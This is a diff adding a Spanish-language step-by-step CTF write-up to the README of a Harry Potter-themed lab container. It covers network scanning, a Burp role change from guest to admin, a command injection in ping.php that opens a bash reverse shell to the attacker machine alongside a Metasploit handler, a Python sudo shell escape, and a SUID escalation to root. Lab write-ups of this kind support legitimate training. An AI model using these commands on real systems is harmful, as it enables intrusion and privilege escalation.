@@ -358,3 +358,122 @@ Para empezar el recorrido desde cero (consola del navegador):
 ```js
 localStorage.clear(); location.href = '/';
 ```
+
+---
+
+## 🧙 Guía de resolución paso a paso (writeup)
+
+> Recorrido consolidado del laboratorio y comandos de referencia para resolver
+> el CTF de principio a fin. Los valores `192.168.x.x` / `156.168.x.0` son
+> **placeholders**: reemplázalos por la IP real de la VM víctima y por la de tu
+> máquina atacante (Kali) según tu red. Material **educativo**; úsalo solo en el
+> entorno aislado del laboratorio.
+
+### Despliegue del contenedor
+
+```bash
+docker run -d --name hogwarts-ctf -p 80:80 -p 2222:22 -p 3000:3000 jleguizamonm/hogwarts-ctf:latest
+```
+
+### 1. Reconocimiento web / Wireshark
+
+```bash
+sudo nmap -sn 156.168.x.0/24      # descubrir hosts en la red
+sudo nmap -sS -sV 192.168.x.x     # puertos y servicios de la víctima
+```
+
+- Revisar los puertos **80** y **3000** (HTTP) en el navegador.
+- Consultar `robots.txt` en el navegador para ubicar la ruta del directorio con
+  el archivo **`.pcap`** y analizarlo con **Wireshark** para obtener las
+  credenciales de **dobby** y el **primer hechizo**.
+
+### 2. SSH
+
+Conectarse con las credenciales de **dobby** obtenidas del `.pcap`:
+
+```bash
+ssh dobby@192.168.x.x -p 2222
+ls -la ~
+cat ~/MensajeDeLucius.txt
+```
+
+### 3. Esteganografía
+
+- Inspeccionar los archivos del entorno (como `slytherin.jpeg` o los recursos
+  disponibles) para extraer datos ocultos.
+
+### 4. Burp Suite
+
+- Acceder a `vault.php` en el navegador e interceptar la petición **POST** de
+  inicio de sesión con **Burp Suite**.
+- Modificar `guest` por `admin`, soltar la intercepción y acceder a la segunda
+  pantalla.
+
+### 5. Metasploit
+
+**Consola 1** — handler a la escucha:
+
+```bash
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST 192.168.x.x
+set LPORT 4444
+run -j
+```
+
+**Consola 2** — disparar la reverse shell (inyección de comandos en `ping.php`):
+
+```bash
+curl -s -G --data-urlencode "ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.x.x/4444 0>&1'" "http://192.168.x.x/ping.php"
+```
+
+**Consola 1** — tomar la sesión recibida:
+
+```bash
+sessions -i 1
+cd /home/bellatrix
+```
+
+### 6. Inyección Python
+
+```bash
+sudo -l 2>/dev/null
+ls -la /home
+sudo -u lucius /home/bellatrix/alimentar_nagini.py
+```
+
+En el prompt del script, escapar a una shell como **lucius**:
+
+```python
+__import__('os').system('/bin/bash')
+```
+
+Dentro de la sesión de **lucius**:
+
+```bash
+cd /home/lucius
+cat nagini_derrotada.txt
+```
+
+- Visitar el enlace mostrado en el archivo.
+
+### 7. Kernel / SUID
+
+```bash
+find / -perm -4000 -o -perm -2000 2>/dev/null
+ls -la /home/lucius.* /root /opt/* /var/www/html 2>/dev/null
+find /tmp -maxdepth 0 -exec /bin/sh -p \;
+id
+cat /opt/ministerio/harry_sacrificio.txt
+```
+
+### 8. Root — último hechizo
+
+Con el usuario ya como **root**, basta moverse a la carpeta `ROOT` para ver el
+último hechizo:
+
+```bash
+cd /root/horcruxes
+cat voldemort_final.txt
+```
